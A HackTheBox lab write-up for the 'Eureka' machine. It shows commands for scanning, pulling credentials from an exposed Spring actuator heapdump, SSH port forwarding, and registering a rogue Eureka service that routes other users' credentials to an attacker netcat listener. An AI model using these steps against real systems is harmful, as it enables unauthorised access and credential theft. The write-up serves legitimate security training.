# Eureka HTB Writeup - HackTheBox - LazyHackers

**Difficulty:** Hard\
**OS:** Linux\

------------------------------------------------------------------------

## Reconnaissance

First, set the target IP as an environment variable for convenience:

``` bash
export IP='10.10.11.66'
```

Run a full TCP scan with service and version detection:

``` bash
nmap -v -sCTV -p- -T4 -Pn -oN $IP.txt $IP
```

**Nmap Results:**

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
    80/tcp   open  http    nginx 1.18.0 (Ubuntu)
    8761/tcp open  http    Apache Tomcat (language: en)

Port **80** redirects to `http://furni.htb/`, so we add it to
`/etc/hosts`:

``` bash
echo "$IP furni.htb" | sudo tee -a /etc/hosts
```

------------------------------------------------------------------------

## Web Enumeration

Brute-force directories on the web server with `dirsearch`:

``` bash
dirsearch -u http://furni.htb/ -e php,html,txt -t 50
```

**Discovered Endpoints:**

    /actuator/env
    /actuator/features
    /actuator/health
    /actuator/info
    /actuator/metrics
    /actuator/configprops
    /actuator/beans
    /actuator/threaddump
    /actuator/loggers
    /actuator/mappings
    /actuator/heapdump   ←  Interesting!

------------------------------------------------------------------------

## Heapdump Extraction

Download the heapdump:

    http://furni.htb/actuator/heapdump

Analyze with `strings`:

``` bash
strings heapdump | grep "password="
```

**Credentials Found:**

    {password=********, user=********}

Another one found with:

``` bash
strings heapdump | grep PWD
```

    http://EurekaSrvr:**************@localhost:8761/eureka

------------------------------------------------------------------------

## Initial Foothold

Login via SSH with the extracted credentials:

``` bash
ssh user@10.10.11.66
Password: ********
```

We now have access as a low-privileged user.

------------------------------------------------------------------------

## Port Forwarding

Since port `8761` is local, forward it to our machine:

``` bash
ssh -L 8761:localhost:8761 user@10.10.11.66
```

Now access the Eureka admin panel:

    http://localhost:8761

------------------------------------------------------------------------

## Exploiting Eureka with Malicious Registration

Set up a netcat listener to catch incoming connections:

``` bash
nc -lvnp 8081
```

Register a **malicious service** with the stolen credentials:

``` bash
curl -X POST http://USERNAME:PASSWORD@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE   -H 'Content-Type: application/json'   -d '{
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "YOURIP",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "YOURIP",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": { "$": 8081, "@enabled": "true" },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}'
```

Replace **USERNAME**, **PASSWORD**, and **YOURIP** (your `tun0` IP).

After \~2 minutes, new credentials arrive via netcat:

    Username: ********
    Password: ********

------------------------------------------------------------------------

## Privilege Escalation

Login with the new user:

``` bash
ssh newuser@10.10.11.66
Password: ********
```

Now we have higher privileges. Retrieve the user flag:

``` bash
cat ~/user.txt
```

------------------------------------------------------------------------

## 🏁 Summary

-    Found hidden endpoints with Dirsearch\
-    Extracted credentials from heapdump\
-    Accessed Eureka dashboard via port forwarding\
-    Exploited service registration to gain credentials\
-    Escalated privileges and obtained user flag

------------------------------------------------------------------------

